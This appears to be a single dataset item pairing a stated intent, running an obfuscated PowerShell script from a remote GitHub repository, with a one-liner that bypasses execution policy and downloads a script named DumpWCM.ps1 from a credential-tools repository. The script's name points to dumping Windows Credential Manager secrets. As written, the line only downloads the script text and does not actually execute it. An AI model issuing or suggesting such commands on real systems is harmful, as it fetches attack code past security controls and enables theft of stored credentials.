# Natural language intent:
# Execute obfuscated PowerShell script from a remote GitHub repository.

powershell.exe -ep bypass -c (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
